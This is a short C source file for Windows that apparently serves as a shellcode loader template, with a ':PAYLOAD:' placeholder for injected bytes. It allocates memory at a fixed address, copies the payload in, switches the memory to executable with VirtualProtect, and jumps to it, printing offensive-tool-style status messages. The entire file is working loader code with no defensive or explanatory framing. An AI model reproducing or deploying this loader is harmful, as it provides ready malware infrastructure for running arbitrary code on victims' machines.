#include <stdio.h>
#include <windows.h>

unsigned char PAYLOAD[]	 = ":PAYLOAD:";
unsigned int PAYLOAD_LEN = sizeof(PAYLOAD);

LPVOID PAYLOAD_ADDR = (LPVOID) 0xaffff000;

void (*entry)();

int main(void) {
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	void* shellcode = VirtualAlloc(PAYLOAD_ADDR, PAYLOAD_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	printf("[+] Memory allocated: 0x%lp\n", shellcode);

	RtlMoveMemory(shellcode, PAYLOAD, PAYLOAD_LEN);
	
	rv = VirtualProtect(shellcode, PAYLOAD_LEN, PAGE_EXECUTE_READ, &oldprotect);

	printf("[+] Permission changed (RX)\n");

	printf("[+] Jumping to shellcode: 0x%lp\n", shellcode);

	entry = (void (*)()) shellcode;
	entry();

	printf("[+] End...");
}